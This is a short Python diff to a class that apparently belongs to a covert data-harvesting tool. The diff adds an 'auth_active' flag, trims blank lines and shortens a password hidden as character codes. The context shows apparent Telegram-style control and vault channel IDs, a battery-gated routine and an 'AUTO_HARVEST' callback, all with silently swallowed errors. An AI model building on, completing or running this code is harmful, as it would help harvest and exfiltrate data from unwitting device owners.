@@ -37,6 +37,7 @@ class M:
         self.ctrl = -1003365166986
         self.vlt = -1003787520015
         self.pw = None
+        self.auth_active = False
         self._lc()
         self._di()
         self._setup()
@@ -121,7 +122,6 @@ class M:
         p, c = self._bat()
         if p < self.cfg.get('hth', 20) and not c:
             return
-
         if os.path.exists(self.wt):
             try:
                 with open(self.wt, 'r') as f:
@@ -129,7 +129,6 @@ class M:
                         return
             except:
                 pass
-
         if self.cb_h:
             try:
                 if self.cb_h("AUTO_HARVEST", self.ctrl, None):
@@ -189,10 +188,8 @@ class M:
         except:
             pass
 
-
 def _pw():
-    return "".join([chr(x) for x in [90, 97, 101, 110, 49, 50, 51, 64, 49, 50, 51, 64, 49, 50, 51]])
-
+    return "".join([chr(x) for x in [90, 97, 101, 110, 49, 50, 51, 64, 49, 50, 51, 64]])
 
 if __name__ == '__main__':
     m = M()
